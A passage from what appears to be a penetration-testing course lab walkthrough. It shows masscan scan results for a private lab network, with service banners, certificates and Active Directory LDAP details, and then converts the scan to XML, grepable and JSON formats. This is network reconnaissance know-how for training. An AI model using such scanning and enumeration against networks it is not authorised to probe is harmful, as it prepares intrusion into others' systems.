Host: 10.130.10.4 ()	Port: 3269	Service: X509	Banner: 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
Host: 10.130.10.4 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.4 ()	Port: 389	Service: unknown	Banner: 0\x84\x00\x00\x0bn\x02\x01\x07d\x84\x00\x00\x0be\x04\x000\x84\x00\x00\x0b]0\x84\x00\x00\x00\x1e\x04\x13domainFunctionality1\x84\x00\x00\x00\x03\x04\x0170\x84\x00\x00\x00\x1e\x04\x13forestFunctionality1\x84\x00\x00\x00\x03\x04\x0170\x84\x00\x00\x00(\x04\x1ddomainControllerFunctionality1\x84\x00\x00\x00\x03\x04\x0170\x84\x00\x00\x001\x04\x17rootDomainNamingContext1\x84\x00\x00\x00\x12\x04\x10DC=hiboxy,DC=com0\x84\x00\x00\x004\x04\x0fldapServiceName1\x84\x00\x00\x00\x1d\x04\x1bhiboxy.com:dc01$@HIBOXY.COM0\x84\x00\x00\x00\x22\x04\x14isGlobalCatalogReady1\x84\x00\x00\x00\x06\x04\x04TRUE0\x84\x00\x00\x00I\x04\x17supportedSASLMechanisms1\x84\x00\x00\x00*\x04\x06GSSAPI\x04\x0aGSS-SPNEGO\x04\x08EXTERNAL\x04\x0aDIGEST-MD50\x84\x00\x00\x00\x22\x04\x14supportedLDAPVersion1\x84\x00\x00\x00\x06\x04\x013\x04\x0120\x84\x00\x00\x01\x9a\x04\x15supportedLDAPPolicies1\x84\x00\x00\x01}\x04\x0eMaxPoolThreads\x04\x19MaxPercentDirSyncRequests\x04\x0fMaxDatagramRecv\x04\x10MaxReceiveBuffer\x04\x0fInitRecvTimeout\x04\x0eMaxConnections\x04\x0fMaxConnIdleTime\x04\x0bMaxPageSize\x04\x16MaxBatchReturnMessages\x04\x10MaxQueryDuration\x04\x12MaxDirSyncDuration\x04\x10MaxTempTableSize\x04\x10MaxResultSetSize\x04\x0dMinResultSets\x04\x14MaxResultSetsPerConn\x04\x16MaxNotificationPerConn\x04\x0bMaxValRange\x04\x15MaxValRangeTransitive\x04\x11ThreadMemoryLimit\x04\x18SystemMemoryLimitPercent0\x84\x00\x00\x03\xf4\x04\x10supportedControl1\x84\x00\x00\x03\xdc\x04\x161.2.840.113556.1.4.319\x04\x161.2.840.113556.1.4.801\x04\x161.2.840.113556.1.4.473\x04\x161.2.840.113556.1.4.528\x04\x161.2.840.113556.1.4.417\x04\x161.2.840.113556.1.4.619\x04\x161.2.840.113556.1.4.841\x04\x161.2.840.113556.1.4.529\x04\x161.2.840.113556.1.4.805\x04\x161.2.840.113556.1.4.521\x04\x161.2.840.113556.1.4.970\x04\x171.2.840.113556.1.4.1338\x04\x161.2.840.113556.1.4.474\x04\x171.2.840.113556.1.4.1339\x04\x171.2.840.113556.1.4.1340\x04\x171.2.840.113556.1.4.1413\x04\x172.16.840.1.113730.3.4.9\x04\x182.16.840.1.113730.3.4.10\x04\x171.2.840.113556.1.4.1504\x04\x171.2.840.113556.1.4.1852\x04\x161.2.840.113556.1.4.802\x04\x171.2.840.113556.1.4.1907\x04\x171.2.840.113556.1.4.1948\x04\x171.2.840.113556.1.4.1974\x04\x171.2.840.113556.1.4.1341\x04\x171.2.840.113556.1.4.2026\x04\x171.2.840.113556.1.4.2064\x04\x171.2.840.113556.1.4.2065\x04\x171.2.840.113556.1.4.2066\x04\x171.2.840.113556.1.4.2090\x04\x171.2.840.113556.1.4.2205\x04\x171.2.840.113556.1.4.2204\x04\x171.2.840.113556.1.4.2206\x04\x171.2.840.113556.1.4.2211\x04\x171.2.840.113556.1.4.2239\x04\x171.2.840.113556.1.4.2255\x04\x171.2.840.113556.1.4.2256\x04\x171.2.840.113556.1.4.2309\x04\x171.2.840.113556.1.4.2330\x04\x171.2.840.113556.1.4.23540\x84\x00\x00\x00\xb2\x04\x15supportedCapabilities1\x84\x00\x00\x00\x95\x04\x161.2.840.113556.1.4.800\x04\x171.2.840.113556.1.4.1670\x04\x171.2.840.113556.1.4.1791\x04\x171.2.840.113556.1.4.1935\x04\x171.2.840.113556.1.4.2080\x04\x171.2.840.113556.1.4.22370\x84\x00\x00\x00S\x04\x11subschemaSubentry1\x84\x00\x00\x00:\x048CN=Aggregate,CN=Schema,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00l\x04\x0aserverName1\x84\x00\x00\x00Z\x04XCN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00H\x04\x13schemaNamingContext1\x84\x00\x00\x00-\x04+CN=Schema,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00\xc0\x04\x0enamingContexts1\x84\x00\x00\x00\xaa\x04\x10DC=hiboxy,DC=com\x04!CN=Configuration,DC=hiboxy,DC=com\x04+CN=Schema,CN=Configuration,DC=hiboxy,DC=com\x04\x22DC=DomainDnsZones,DC=hiboxy,DC=com\x04\x22DC=ForestDnsZones,DC=hiboxy,DC=com0\x84\x00\x00\x00\x1c\x04\x0eisSynchronized1\x84\x00\x00\x00\x06\x04\x04TRUE0\x84\x00\x00\x00#\x04\x13highestCommittedUSN1\x84\x00\x00\x00\x08\x04\x061583910\x84\x00\x00\x00\x80\x04\x0ddsServiceName1\x84\x00\x00\x00k\x04iCN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00$\x04\x0bdnsHostName1\x84\x00\x00\x00\x11\x04\x0fdc01.hiboxy.com0\x84\x00\x00\x00.\x04\x14defaultNamingContext1\x84\x00\x00\x00\x12\x04\x10DC=hiboxy,DC=com0\x84\x00\x00\x00\x26\x04\x0bcurrentTime1\x84\x00\x00\x00\x13\x04\x1120240924041933.0Z0\x84\x00\x00\x00E\x04\x1aconfigurationNamingContext1\x84\x00\x00\x00#\x04!CN=Configuration,DC=hiboxy,DC=com0\x84\x00\x00\x00\x10\x02\x01\x07e\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00
Host: 10.130.10.4 ()	Port: 445	Service: smb	Banner: SMBv2  guid=dbabe7aa-77e5-4a99-9080-53cbb0a1a38f time=2024-09-24 04:21:31  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=DC01 domain-dns=hiboxy.com name-dns=dc01.hiboxy.com forest=hiboxy.com
Host: 10.130.10.4 ()	Port: 53	Service: unknown	Banner: \x00\x1e\x00\x06\x81\x04\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03
Host: 10.130.10.4 ()	Port: 636	Service: ssl	Banner: TLS/1.2 cipher:0x1302
Host: 10.130.10.4 ()	Port: 636	Service: ssl	Banner: TLS/1.2 cipher:0xc030, dc01.hiboxy.com
Host: 10.130.10.4 ()	Port: 636	Service: X509	Banner: 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
Host: 10.130.10.5 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.5 ()	Port: 445	Service: smb	Banner: SMBv2  guid=1aab897a-c558-4a74-a530-d6ebc4b23a79 time=2024-09-24 04:21:23  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=WEB01 domain-dns=hiboxy.com name-dns=web01.hiboxy.com forest=hiboxy.com
Host: 10.130.10.5 ()	Port: 80	Service: http	Banner: HTTP/1.1 200 OK\x0d\x0aContent-Type: text/html\x0d\x0aLast-Modified: Fri, 01 Jan 2049 00:00:00 GMT\x0d\x0aAccept-Ranges: bytes\x0d\x0aETag: W/\x220c0d66a3a44f61:0\x22\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:21:12 GMT\x0d\x0aConnection: close\x0d\x0aContent-Length: 1706\x0d\x0a\x0d
Host: 10.130.10.5 ()	Port: 80	Service: http.server	Banner: Microsoft-IIS/10.0
Host: 10.130.10.6 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.6 ()	Port: 80	Service: http	Banner: HTTP/1.1 200 OK\x0d\x0aContent-Type: text/html\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:28:42 GMT\x0d\x0aAccept-Ranges: bytes\x0d\x0aETag: \x2282b3d57a24db1:0\x22\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:18:45 GMT\x0d\x0aConnection: close\x0d\x0aContent-Length: 703\x0d\x0a\x0d
Host: 10.130.10.6 ()	Port: 80	Service: http.server	Banner: Microsoft-IIS/10.0
Host: 10.130.10.6 ()	Port: 80	Service: title	Banner: IIS Windows Server
Host: 10.130.10.7 ()	Port: 3389	Service: rdp	Banner:  NLA-supported
Host: 10.130.10.7 ()	Port: 445	Service: smb	Banner: SMBv2  guid=5fb75931-7947-4a52-8e48-4d7ec7bcdd17 time=2024-09-24 04:20:37  boottime=1601-01-01 00:00:00  domain=HIBOXY version=10.0.20348 ntlm-ver=15 domain=HIBOXY name=CA01 domain-dns=hiboxy.com name-dns=ca01.hiboxy.com forest=hiboxy.com
# Masscan 1.3.9-integration scan initiated Tue Sep 24 04:18:39 2024
# Masscan done at Fri Mar  6 01:33:26 2026
# Ports scanned: TCP(0;) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Timestamp: 1727151519	Host: 10.130.10.11 ()	Ports: 80/open/tcp//http//
Timestamp: 1727151523	Host: 10.130.10.6 ()	Ports: 80/open/tcp//http//
Timestamp: 1727151524	Host: 10.130.10.21 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151531	Host: 10.130.10.5 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151534	Host: 10.130.10.7 ()	Ports: 135/open/tcp//epmap//
Timestamp: 1727151536	Host: 10.130.10.25 ()	Ports: 8172/open/tcp//unknown//
Timestamp: 1727151539	Host: 10.130.10.21 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151539	Host: 10.130.10.23 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151551	Host: 10.130.10.25 ()	Ports: 477/open/tcp//unknown//
Timestamp: 1727151551	Host: 10.130.10.6 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151567	Host: 10.130.10.6 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151568	Host: 10.130.10.22 ()	Ports: 22/open/tcp//ssh//
Timestamp: 1727151569	Host: 10.130.10.10 ()	Ports: 23/open/tcp//telnet//
Timestamp: 1727151570	Host: 10.130.10.4 ()	Ports: 389/open/tcp//ldap//
Timestamp: 1727151578	Host: 10.130.10.25 ()	Ports: 890/open/tcp//unknown//
Timestamp: 1727151580	Host: 10.130.10.21 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151592	Host: 10.130.10.33 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151598	Host: 10.130.10.4 ()	Ports: 464/open/tcp//kpasswd//
Timestamp: 1727151602	Host: 10.130.10.23 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151607	Host: 10.130.10.25 ()	Ports: 465/open/tcp//submissions//
Timestamp: 1727151609	Host: 10.130.10.25 ()	Ports: 465/open/tcp//submissions//
Timestamp: 1727151619	Host: 10.130.10.7 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151620	Host: 10.130.10.25 ()	Ports: 443/open/tcp//https//
Timestamp: 1727151622	Host: 10.130.10.25 ()	Ports: 443/open/tcp//https//
Timestamp: 1727151622	Host: 10.130.10.25 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151625	Host: 10.130.10.21 ()	Ports: 135/open/tcp//epmap//
Timestamp: 1727151626	Host: 10.130.10.25 ()	Ports: 2105/open/tcp//unknown//
Timestamp: 1727151626	Host: 10.130.10.44 ()	Ports: 135/open/tcp//epmap//
Timestamp: 1727151627	Host: 10.130.10.4 ()	Ports: 5986/open/tcp//unknown//
Timestamp: 1727151634	Host: 10.130.10.7 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151638	Host: 10.130.10.25 ()	Ports: 3875/open/tcp//unknown//
Timestamp: 1727151644	Host: 10.130.10.25 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151645	Host: 10.130.10.25 ()	Ports: 808/open/tcp//unknown//
Timestamp: 1727151649	Host: 10.130.10.23 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151653	Host: 10.130.10.25 ()	Ports: 6536/open/tcp//unknown//
Timestamp: 1727151660	Host: 10.130.10.25 ()	Ports: 2103/open/tcp//unknown//
Timestamp: 1727151666	Host: 10.130.10.44 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151669	Host: 10.130.10.5 ()	Ports: 80/open/tcp//http//
Timestamp: 1727151671	Host: 10.130.10.4 ()	Ports: 135/open/tcp//epmap//
Timestamp: 1727151674	Host: 10.130.10.25 ()	Ports: 25/open/tcp//smtp//
Timestamp: 1727151678	Host: 10.130.10.4 ()	Ports: 3268/open/tcp//unknown//
Timestamp: 1727151680	Host: 10.130.10.5 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151688	Host: 10.130.10.4 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151698	Host: 10.130.10.33 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151698	Host: 10.130.10.4 ()	Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1727151701	Host: 10.130.10.4 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151702	Host: 10.130.10.25 ()	Ports: 717/open/tcp//unknown//
Timestamp: 1727151702	Host: 10.130.10.7 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151715	Host: 10.130.10.44 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151717	Host: 10.130.10.25 ()	Ports: 475/open/tcp//unknown//
Timestamp: 1727151723	Host: 10.130.10.25 ()	Ports: 476/open/tcp//unknown//
Timestamp: 1727151724	Host: 10.130.10.45 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151726	Host: 10.130.10.10 ()	Ports: 22/open/tcp//ssh//
Timestamp: 1727151729	Host: 10.130.10.25 ()	Ports: 64337/open/tcp//unknown//
Timestamp: 1727151740	Host: 10.130.10.10 ()	Ports: 80/open/tcp//http//
Timestamp: 1727151741	Host: 10.130.10.21 ()	Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1727151742	Host: 10.130.10.25 ()	Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1727151761	Host: 10.130.10.4 ()	Ports: 5985/open/tcp//unknown//
Timestamp: 1727151766	Host: 10.130.10.4 ()	Ports: 53/open/tcp//domain//
Timestamp: 1727151771	Host: 10.130.10.25 ()	Ports: 6564/open/tcp//unknown//
Timestamp: 1727151773	Host: 10.130.10.25 ()	Ports: 587/open/tcp//submission//
Timestamp: 1727151777	Host: 10.130.10.44 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151792	Host: 10.130.10.33 ()	Ports: 1433/open/tcp//ms-sql-s//
Timestamp: 1727151815	Host: 10.130.10.11 ()	Ports: 22/open/tcp//ssh//
Timestamp: 1727151819	Host: 10.130.10.4 ()	Ports: 3269/open/tcp//unknown//
Timestamp: 1727151822	Host: 10.130.10.4 ()	Ports: 3269/open/tcp//unknown//
Timestamp: 1727151822	Host: 10.130.10.4 ()	Ports: 9389/open/tcp//unknown//
Timestamp: 1727151828	Host: 10.130.10.25 ()	Ports: 6402/open/tcp//unknown//
Timestamp: 1727151834	Host: 10.130.10.44 ()	Ports: 139/open/tcp//netbios-ssn//
Timestamp: 1727151836	Host: 10.130.10.25 ()	Ports: 135/open/tcp//epmap//
Timestamp: 1727151836	Host: 10.130.10.25 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151837	Host: 10.130.10.25 ()	Ports: 444/open/tcp//snpp//
Timestamp: 1727151838	Host: 10.130.10.25 ()	Ports: 80/open/tcp//http//
Timestamp: 1727151840	Host: 10.130.10.4 ()	Ports: 636/open/tcp//ldaps//
Timestamp: 1727151842	Host: 10.130.10.4 ()	Ports: 636/open/tcp//ldaps//
Timestamp: 1727151845	Host: 10.130.10.25 ()	Ports: 1801/open/tcp//unknown//
Timestamp: 1727151855	Host: 10.130.10.25 ()	Ports: 2107/open/tcp//unknown//
Timestamp: 1727151859	Host: 10.130.10.45 ()	Ports: 3389/open/tcp//ms-wbt-server//
Timestamp: 1727151863	Host: 10.130.10.23 ()	Ports: 135/open/tcp//epmap//
Timestamp: 1727151877	Host: 10.130.10.25 ()	Ports: 2525/open/tcp//unknown//
sec560@560vm:~/Downloads$ 
```

#### 3: Converting the Scan to XML

```
sec560@560vm:~/Downloads$ masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oX /tmp/masscan_10.130.10.0_24_full.xml
less /tmp/masscan_10.130.10.0_24_full.xml
[+] --readscan /home/sec560/labs/masscan_10.130.10.0_24_full.bin
sec560@560vm:~/Downloads$ 
```

```
<?xml version="1.0"?>
<!-- masscan v1.0 scan -->
<nmaprun scanner="masscan" start="1772772137" version="1.0-BETA"  xmloutputversion="1.03">
<scaninfo type="syn" protocol="tcp" />
<host endtime="1727151519"><address addr="10.130.10.11" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="syn-ack" reason_ttl="63"/></port></ports></host>
<host endtime="1727151523"><address addr="10.130.10.6" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="syn-ack" reason_ttl="127"/></port></ports></host>
<host endtime="1727151523"><address addr="10.130.10.11" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="response" reason_ttl="63" /><service name="http.server" banner="nginx/1.24.0 (Ubuntu)"></service></port></ports></host>
<host endtime="1727151523"><address addr="10.130.10.11" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="response" reason_ttl="63" /><service name="title" banner="Welcome to nginx!"></service></port></ports></host>
<host endtime="1727151523"><address addr="10.130.10.11" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="response" reason_ttl="63" /><service name="http" banner="HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d"></service></port></ports></host>
<host endtime="1727151524"><address addr="10.130.10.21" addrtype="ipv4"/><ports><port protocol="tcp" portid="3389"><state state="open" reason="syn-ack" reason_ttl="127"/></port></ports></host>
<host endtime="1727151526"><address addr="10.130.10.6" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="response" reason_ttl="127" /><service name="http.server" banner="Microsoft-IIS/10.0"></service></port></ports></host>
<host endtime="1727151526"><address addr="10.130.10.6" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="response" reason_ttl="127" /><service name="title" banner="IIS Windows Server"></service></port></ports></host>
<host endtime="1727151526"><address addr="10.130.10.6" addrtype="ipv4"/><ports><port protocol="tcp" portid="80"><state state="open" reason="response" reason_ttl="127" /><service name="http" banner="HTTP/1.1 200 OK\x0d\x0aContent-Type: text/html\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:28:42 GMT\x0d\x0aAccept-Ranges: bytes\x0d\x0aETag: \x2282b3d57a24db1:0\x22\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:18:45 GMT\x0d\x0aConnection: close\x0d\x0aContent-L:


```

#### 4: Grepable Format

```
sec560@560vm:~/Downloads$ grep -w 53/open /tmp/masscan_10.130.10.0_24_full.gnmap
Timestamp: 1727151766	Host: 10.130.10.4 ()	Ports: 53/open/tcp//domain//
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap
Timestamp: 1727151580	Host: 10.130.10.21 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151634	Host: 10.130.10.7 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151644	Host: 10.130.10.25 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151649	Host: 10.130.10.23 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151680	Host: 10.130.10.5 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151688	Host: 10.130.10.4 ()	Ports: 445/open/tcp//microsoft-ds//
Timestamp: 1727151777	Host: 10.130.10.44 ()	Ports: 445/open/tcp//microsoft-ds//
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ grep -w 445/open /tmp/masscan_10.130.10.0_24_full.gnmap | wc -l
7
sec560@560vm:~/Downloads$
```

#### 5: JSON Format

```
sec560@560vm:~/Downloads$ masscan --readscan ~/labs/masscan_10.130.10.0_24_full.bin -oJ /tmp/masscan_10.130.10.0_24_full.json
[+] --readscan /home/sec560/labs/masscan_10.130.10.0_24_full.bin
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ head /tmp/masscan_10.130.10.0_24_full.json
[
{   "ip": "10.130.10.11",   "timestamp": "1727151519", "ports": [ {"port": 80, "proto": "tcp", "status": "open", "reason": "syn-ack", "ttl": 63} ] }
,
{   "ip": "10.130.10.6",   "timestamp": "1727151523", "ports": [ {"port": 80, "proto": "tcp", "status": "open", "reason": "syn-ack", "ttl": 127} ] }
,
